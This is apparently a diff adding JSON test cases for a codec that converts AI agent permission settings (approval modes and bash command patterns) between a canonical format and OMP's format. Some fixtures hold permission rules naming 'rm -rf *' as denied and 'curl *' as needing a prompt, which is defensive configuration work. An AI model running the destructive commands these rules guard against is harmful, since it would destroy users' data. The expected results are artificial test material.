+      "from": "omp-codec.test.ts: ompCodec default mode > never approves a write or exec call that the canonical mode asks for",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "standard"
+        }
+      ],
+      "expect": {
+        "tools": {
+          "approvalMode": "always-ask"
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.147",
+      "from": "omp-codec.test.ts: ompCodec default mode > never approves a write or exec call that the canonical mode asks for",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "autonomous"
+        }
+      ],
+      "expect": {},
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.148",
+      "from": "omp-codec.test.ts: ompCodec default mode > never approves a write or exec call that the canonical mode asks for",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "restricted"
+        }
+      ],
+      "expect": {
+        "tools": {
+          "approvalMode": "always-ask"
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.149",
+      "from": "omp-codec.test.ts: ompCodec default mode > never approves a write or exec call that the canonical mode asks for",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "plan"
+        }
+      ],
+      "expect": {
+        "tools": {
+          "approvalMode": "always-ask"
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.150",
+      "from": "omp-codec.test.ts: ompCodec default mode > never approves a write or exec call that the canonical mode asks for",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "acceptEdits"
+        }
+      ],
+      "expect": {
+        "tools": {
+          "approvalMode": "always-ask"
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.151",
+      "from": "omp-codec.test.ts: ompCodec default mode > never approves a write or exec call that the canonical mode asks for",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "bypassPermissions"
+        }
+      ],
+      "expect": {},
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.152",
+      "from": "omp-codec.test.ts: ompCodec default mode > never approves a write or exec call that the canonical mode asks for",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "default"
+        }
+      ],
+      "expect": {
+        "tools": {
+          "approvalMode": "always-ask"
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.153",
+      "from": "omp-codec.test.ts: ompCodec default mode > never approves a write or exec call that the canonical mode asks for",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "auto"
+        }
+      ],
+      "expect": {
+        "tools": {
+          "approvalMode": "always-ask"
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.154",
+      "from": "omp-codec.test.ts: ompCodec default mode > refuses every mode read as readonly, which OMP has no mode for",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "readonly"
+        }
+      ],
+      "throws": {
+        "name": "UnsupportedCapabilityError",
+        "checks": [
+          {
+            "at": ["agent"],
+            "subset": "omp"
+          },
+          {
+            "at": ["unsupported"],
+            "subset": []
+          },
+          {
+            "at": ["settings"],
+            "subset": [
+              {
+                "setting": "defaultMode",
+                "value": "readonly"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "omp-codec.155",
+      "from": "omp-codec.test.ts: ompCodec default mode > refuses every mode read as readonly, which OMP has no mode for",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "dontAsk"
+        }
+      ],
+      "throws": {
+        "name": "UnsupportedCapabilityError",
+        "checks": [
+          {
+            "at": ["agent"],
+            "subset": "omp"
+          },
+          {
+            "at": ["unsupported"],
+            "subset": []
+          },
+          {
+            "at": ["settings"],
+            "subset": [
+              {
+                "setting": "defaultMode",
+                "value": "dontAsk"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "omp-codec.156",
+      "from": "omp-codec.test.ts: ompCodec default mode > refuses readonly, which OMP has no mode for",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "readonly"
+        }
+      ],
+      "throws": {
+        "name": "UnsupportedCapabilityError",
+        "message": ["defaultMode: readonly"],
+        "checks": [
+          {
+            "at": ["agent"],
+            "subset": "omp"
+          },
+          {
+            "at": ["unsupported"],
+            "subset": []
+          },
+          {
+            "at": ["settings"],
+            "subset": [
+              {
+                "setting": "defaultMode",
+                "value": "readonly"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "omp-codec.157",
+      "from": "omp-codec.test.ts: ompCodec decode > reads tools.approvalMode as the default mode, never looser than OMP",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.decode",
+      "args": [
+        {
+          "tools": {
+            "approvalMode": "always-ask"
+          }
+        }
+      ],
+      "checks": [
+        {
+          "at": ["defaultMode"],
+          "equals": "standard"
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.158",
+      "from": "omp-codec.test.ts: ompCodec decode > reads tools.approvalMode as the default mode, never looser than OMP",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.decode",
+      "args": [
+        {
+          "tools": {
+            "approvalMode": "write"
+          }
+        }
+      ],
+      "checks": [
+        {
+          "at": ["defaultMode"],
+          "equals": "standard"
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.159",
+      "from": "omp-codec.test.ts: ompCodec decode > reads tools.approvalMode as the default mode, never looser than OMP",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.decode",
+      "args": [
+        {
+          "tools": {
+            "approvalMode": "yolo"
+          }
+        }
+      ],
+      "checks": [
+        {
+          "at": ["defaultMode"],
+          "equals": "autonomous"
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.160",
+      "from": "omp-codec.test.ts: ompCodec decode > reads tools.approvalMode as the default mode, never looser than OMP",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.decode",
+      "args": [
+        {
+          "tools": {}
+        }
+      ],
+      "checks": [
+        {
+          "at": ["defaultMode"],
+          "absent": true
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.161",
+      "from": "omp-codec.test.ts: ompCodec decode > refuses an approval mode OMP does not define instead of guessing",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.parse",
+      "args": [
+        {
+          "tools": {
+            "approvalMode": "sometimes"
+          }
+        }
+      ],
+      "throws": {}
+    },
+    {
+      "id": "omp-codec.162",
+      "from": "omp-codec.test.ts: ompCodec decode > reads bash.patterns in order, ignoring the rest of the config",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.decode",
+      "args": [
+        {
+          "model": "x",
+          "tools": {
+            "approvalMode": "yolo"
+          },
+          "bash": {
+            "patterns": [
+              {
+                "match": "git *",
+                "approval": "allow"
+              },
+              {
+                "match": "curl *",
+                "approval": "prompt"
+              },
+              {
+                "match": "rm -rf *",
+                "approval": "deny"
+              }
+            ]
+          }
+        }
+      ],
+      "checks": [
+        {
+          "at": ["rules"],
+          "equals": [
+            {
+              "tool": "Bash",
+              "pattern": "git *",
+              "tier": "allow"
+            },
+            {
+              "tool": "Bash",
+              "pattern": "curl *",
+              "tier": "ask"
+            },
+            {
+              "tool": "Bash",
+              "pattern": "rm -rf *",
+              "tier": "deny"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.163",
+      "from": "omp-codec.test.ts: ompCodec decode > collapses whitespace as OMP does",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.decode",
+      "args": [
+        {
+          "bash": {
+            "patterns": [
+              {
+                "match": "  git    push  ",
+                "approval": "deny"
+              }
+            ]
+          }
+        }
+      ],
+      "checks": [
+        {
+          "at": ["rules", 0, "pattern"],
+          "equals": "git push"
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.164",
+      "from": "omp-codec.test.ts: ompCodec decode > gives an empty policy for a config with no bash.patterns",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.decode",
+      "args": [{}],
+      "expect": {}
+    },
+    {
+      "id": "omp-codec.165",
+      "from": "omp-codec.test.ts: ompCodec decode > gives an empty policy for a config with no bash.patterns",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.decode",
+      "args": [
+        {
+          "bash": {}
+        }
+      ],
+      "expect": {}
+    },
+    {
+      "id": "omp-codec.166",
+      "from": "omp-codec.test.ts: ompCodec decode > refuses an entry it cannot read faithfully instead of skipping it",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.decode",
+      "args": [
+        {
+          "bash": {
+            "patterns": [
+              {
+                "match": "rm *",
+                "approval": "forbid"
+              }
+            ]
+          }
+        }
+      ],
+      "throws": {
+        "name": "ZodError"
+      }
+    },
+    {
+      "id": "omp-codec.167",
+      "from": "omp-codec.test.ts: ompCodec decode > refuses an entry it cannot read faithfully instead of skipping it",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.decode",
+      "args": [
+        {
+          "bash": {
+            "patterns": [
+              {
+                "approval": "deny"
+              }
+            ]
+          }
+        }
+      ],
+      "throws": {
+        "name": "ZodError"
+      }
+    },
+    {
+      "id": "omp-codec.168",
+      "from": "omp-codec.test.ts: ompCodec decode > refuses an entry it cannot read faithfully instead of skipping it",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.decode",
+      "args": [
+        {
+          "bash": {
+            "patterns": [
+              {
+                "match": "",
+                "approval": "deny"
+              }
+            ]
+          }
+        }
+      ],
+      "throws": {
+        "name": "Error"
+      }
+    },
+    {
+      "id": "omp-codec.169",
+      "from": "omp-codec.test.ts: ompCodec decode > refuses an entry it cannot read faithfully instead of skipping it",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.decode",
+      "args": [
+        {
+          "bash": {
+            "patterns": [
+              {
+                "match": "   ",
+                "approval": "deny"
+              }
+            ]
+          }
+        }
+      ],
+      "throws": {
+        "name": "Error"
+      }
+    },
+    {
+      "id": "omp-codec.170",
+      "from": "omp-codec.test.ts: ompCodec decode > refuses an entry it cannot read faithfully instead of skipping it",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.decode",
+      "args": [
+        {
+          "bash": {
+            "patterns": [
+              {
+                "match": "git:*",
+                "approval": "deny"
+              }
+            ]
+          }
+        }
+      ],
+      "throws": {
+        "name": "Error"
+      }
+    },
+    {
+      "id": "omp-codec.171",
+      "from": "omp-codec.test.ts: ompCodec decode > refuses an entry it cannot read faithfully instead of skipping it",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.decode",
+      "args": [
+        {
+          "bash": {
+            "patterns": ["rm *"]
+          }
+        }
+      ],
+      "throws": {
+        "name": "ZodError"
+      }
+    },
+    {
+      "id": "omp-codec.172",
+      "from": "omp-codec.test.ts: ompCodec decode > takes a backslash in OMP's pattern as the character it is",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.decode",
+      "args": [
+        {
+          "bash": {
+            "patterns": [
+              {
+                "match": "echo a\\b",
+                "approval": "deny"
+              }
+            ]
+          }
+        }
+      ],
+      "checks": [
+        {
+          "at": ["rules", 0, "pattern"],
+          "equals": "echo a\\\\b"
+        },
+        {
+          "at": ["rules", 0, "tier"],
+          "equals": "deny"
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.173",
+      "from": "omp-codec.test.ts: omp as a format > is detected from bash.patterns",
+      "kind": "function",
+      "module": "api",
+      "function": "detectFormat",
+      "args": [
+        {
+          "bash": {
+            "patterns": [
+              {
+                "match": "rm *",
+                "approval": "deny"
+              }
+            ]
+          }
+        }
+      ],
+      "expect": "omp"
+    },
+    {
+      "id": "omp-codec.174",
+      "from": "omp-codec.test.ts: omp as a format > is detected from bash.patterns",
+      "kind": "function",
+      "module": "api",
+      "function": "detectFormat",
+      "args": [
+        {
+          "bash": {
+            "rm *": "deny"
+          }
+        }
+      ],
+      "expect": "opencode"
+    },
+    {
+      "id": "omp-codec.175",
+      "from": "omp-codec.test.ts: omp as a format > is detected from tools.approvalMode alone",
+      "kind": "function",
+      "module": "api",
+      "function": "detectFormat",
+      "args": [
+        {
+          "tools": {
+            "approvalMode": "always-ask"
+          }
+        }
+      ],
+      "expect": "omp"
+    },
+    {
+      "id": "omp-codec.176",
+      "from": "omp-codec.test.ts: omp as a format > is detected from tools.approvalMode alone",
+      "kind": "function",
+      "module": "api",
+      "function": "detectFormat",
+      "args": [
+        {
+          "tools": {
+            "approvalMode": "never"
+          }
+        }
+      ],
+      "expectUndefined": true
+    },
+    {
+      "id": "omp-codec.177",
+      "from": "omp-codec.test.ts: omp as a format > converts a mode from canonical and back",
+      "kind": "function",
+      "module": "api",
+      "function": "convert",
+      "args": [
+        "canonical",
+        "omp",
+        {
+          "defaultMode": "restricted"
+        }
+      ],
+      "checks": [
+        {
+          "at": ["output"],
+          "equals": {
+            "tools": {
+              "approvalMode": "always-ask"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.178",
+      "from": "omp-codec.test.ts: omp as a format > converts a mode from canonical and back",
+      "kind": "function",
+      "module": "api",
+      "function": "convert",
+      "args": [
+        "omp",
+        "canonical",
+        {
+          "tools": {
+            "approvalMode": "always-ask"
+          }
+        }
+      ],
+      "checks": [
+        {
+          "at": ["output", "defaultMode"],
+          "equals": "standard"
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.179",
+      "from": "omp-codec.test.ts: omp as a format > converts from canonical and back",
+      "kind": "function",
+      "module": "api",
+      "function": "convert",
+      "args": [
+        "canonical",
+        "omp",
+        {
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "rm:*",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "expect": {
+        "output": {
+          "bash": {
+            "patterns": [
+              {
+                "match": "rm",
+                "approval": "deny"
+              },
+              {
+                "match": "rm *",
+                "approval": "deny"
+              }
+            ]
+          }
+        },
+        "from": "canonical",
+        "ruleCount": 1,
+        "companions": []
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.180",
+      "from": "omp-codec.test.ts: omp as a format > converts from canonical and back",
+      "kind": "function",
+      "module": "api",
+      "function": "convert",
+      "args": [
+        "omp",
+        "canonical",
+        {
+          "bash": {
+            "patterns": [
+              {
+                "match": "rm",
+                "approval": "deny"
+              },
+              {
+                "match": "rm *",
+                "approval": "deny"
+              }
+            ]
+          }
+        }
+      ],
+      "expect": {
+        "output": {
+          "$schema": "https://github.com/ExaDev/agent-permissions/releases/latest/download/agent-permissions.schema.json",
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "rm",
+              "tier": "deny"
+            },
+            {
+              "tool": "Bash",
+              "pattern": "rm *",
+              "tier": "deny"
+            }
+          ]
+        },
+        "from": "omp",
+        "ruleCount": 2,
+        "companions": []
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.181",
+      "from": "omp-codec.test.ts: omp as a format > refuses to convert a policy it cannot enforce",
+      "kind": "function",
+      "module": "api",
+      "function": "convert",
+      "args": [
+        "canonical",
+        "omp",
+        {
+          "rules": [
+            {
+              "tool": "Write",
+              "pattern": "./x",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "throws": {
+        "name": "UnsupportedCapabilityError",
+        "checks": [
+          {
+            "at": ["agent"],
+            "subset": "omp"
+          },
+          {
+            "at": ["unsupported"],
+            "subset": [
+              {
+                "rule": {
+                  "tool": "Write",
+                  "pattern": "./x",
+                  "tier": "deny"
+                }
+              }
+            ]
+          },
+          {
+            "at": ["settings"],
+            "subset": []
+          }
+        ]
+      }
+    }
+  ]
+}
